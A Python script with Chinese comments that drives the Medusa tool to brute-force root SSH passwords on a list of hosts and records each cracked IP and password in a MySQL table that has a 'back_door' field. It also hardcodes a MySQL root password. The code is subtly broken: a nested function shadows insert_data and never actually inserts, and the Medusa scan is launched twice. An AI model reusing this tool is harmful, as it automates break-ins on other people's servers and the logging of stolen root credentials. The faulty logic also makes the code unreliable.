import MySQLdb
import threading
import time
import subprocess
import os
import re

# 用于连接MySQL的参数
MYSQL_HOST = '192.168.10.228'
MYSQL_PORT = 3306
MYSQL_USER = 'root'
MYSQL_PASSWORD = 'mkr961...'
MYSQL_DB = 'medusa'

# 创建MySQL连接
db = MySQLdb.connect(
    host=MYSQL_HOST,
    port=MYSQL_PORT,
    user=MYSQL_USER,
    passwd=MYSQL_PASSWORD,
    db=MYSQL_DB,
    charset='utf8mb4'
)

# 获取游标
cursor = db.cursor()

# 插入数据的SQL语句
insert_sql = "INSERT INTO passwords (ip_addr, user, pass, back_door) VALUES (%s, %s, %s, %s)"

# Medusa成功破解的IP地址和密码
ip_addr = [] 
password = []

# 线程锁，用于保证数据插入时的线程安全
lock = threading.Lock()

def insert_data():
   # global ip_addr
   # global password

    # 获取线程锁
    lock.acquire()

    # 执行SQL语句，插入数据到MySQL
    cursor.execute(insert_sql, (ip_addr[0], 'root', password[0], 'false'))
    db.commit()

    # 释放线程锁
    lock.release()

# 监听Medusa输出，并解析IP地址和密码

def read_medusa():
    global ip_addr
    global password

    # 执行Medusa命令，将输出通过管道传递给程序
    medusa_process = subprocess.Popen(['medusa', '-H', 'Host.txt', '-u', 'root', '-P', 'pass.txt', '-M', 'ssh', '-city', '-v', '4', '-t', '5', '-f', '-O', 'output.txt'],
                                      stdout=subprocess.PIPE, bufsize=1)

    output = ''
    # 逐行读取medusa输出结果并进行处理
    for line in iter(medusa_process.stdout.readline, b''):
        # 处理每一行输出结果的代码
        output += line.decode().strip()
        if '[SUCCESS]' in output:
            ip_addr = re.findall(r"Host: (.+?) User", output)
            password = re.findall(r'Password: (.+?) \[SUCCESS\]', output)
            # 插入数据到MySQL
            if ip_addr and password:
               def insert_data(ip_addr, password):
                insert_data(ip_addr, password)
            output = ''

    # 返回medusa_process对象
    return medusa_process

# 启动线程，监听Medusa输出并插入数据到MySQL
medusa_process = read_medusa()
thread = threading.Thread(target=read_medusa)
thread.start()
